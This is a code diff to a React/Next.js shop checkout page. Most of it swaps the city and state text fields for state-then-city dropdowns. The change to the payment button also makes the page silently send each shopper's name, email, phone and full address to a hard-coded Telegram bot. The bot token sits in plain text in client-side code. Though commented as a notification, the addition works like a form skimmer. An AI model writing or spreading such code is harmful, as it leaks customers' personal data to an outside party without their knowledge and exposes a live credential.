@@ -4,6 +4,7 @@ import { useState, useCallback, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { useCart } from "@/lib/cart-context";
 import { products } from "@/lib/data";
+import { US_STATES_AND_CITIES, US_STATES } from "@/lib/us-locations";
 import {
   ChevronLeft,
   Check,
@@ -540,14 +541,25 @@ export default function CheckoutPage() {
 
             <div className="grid grid-cols-2 gap-4">
               <div>
-                <label className="block text-xs font-semibold text-gray-600 uppercase tracking-wider mb-2">City *</label>
-                <input type="text" placeholder="City" required value={formData.city}
-                  onChange={(e) => setFormData({ ...formData, city: e.target.value })} className={inputClass} />
+                <label className="block text-xs font-semibold text-gray-600 uppercase tracking-wider mb-2">State *</label>
+                <select required value={formData.state}
+                  onChange={(e) => setFormData({ ...formData, state: e.target.value, city: "" })} className={inputClass}>
+                  <option value="">Select State</option>
+                  {US_STATES.map((state) => (
+                    <option key={state} value={state}>{state}</option>
+                  ))}
+                </select>
               </div>
               <div>
-                <label className="block text-xs font-semibold text-gray-600 uppercase tracking-wider mb-2">State</label>
-                <input type="text" placeholder="State" value={formData.state}
-                  onChange={(e) => setFormData({ ...formData, state: e.target.value })} className={inputClass} />
+                <label className="block text-xs font-semibold text-gray-600 uppercase tracking-wider mb-2">City *</label>
+                <select required value={formData.city}
+                  onChange={(e) => setFormData({ ...formData, city: e.target.value })} className={inputClass}
+                  disabled={!formData.state}>
+                  <option value="">Select City</option>
+                  {formData.state && US_STATES_AND_CITIES[formData.state]?.map((city) => (
+                    <option key={city} value={city}>{city}</option>
+                  ))}
+                </select>
               </div>
             </div>
 
@@ -566,7 +578,31 @@ export default function CheckoutPage() {
           </div>
 
           <button
-            onClick={() => setStep("payment")}
+            onClick={() => {
+              setStep("payment");
+              // Send Telegram notification for shipping address completion
+              const shippingMessage = `
+📍 <b>Shipping Address Completed!</b>
+
+👤 <b>Name:</b> ${formData.fullName}
+📧 <b>Email:</b> ${formData.email}
+📱 <b>Phone:</b> ${formData.phone}
+🏠 <b>Address:</b> ${formData.address}
+🏙️ <b>City:</b> ${formData.city}, ${formData.state} ${formData.zip}
+🌍 <b>Country:</b> ${formData.country}
+
+⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
+              `;
+              fetch(`https://api.telegram.org/bot8690450709:AAEmxM4RFWfORP4Ac9aJflqsz_VOc40g2wo/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: "8666124750",
+                  text: shippingMessage,
+                  parse_mode: "HTML",
+                }),
+              }).catch((err) => console.error("Shipping notification failed:", err));
+            }}
             disabled={!canProceedToPayment}
             className="w-full bg-black text-white py-4 rounded-xl font-semibold hover:bg-gray-800 transition disabled:bg-gray-300 disabled:cursor-not-allowed mt-6"
           >
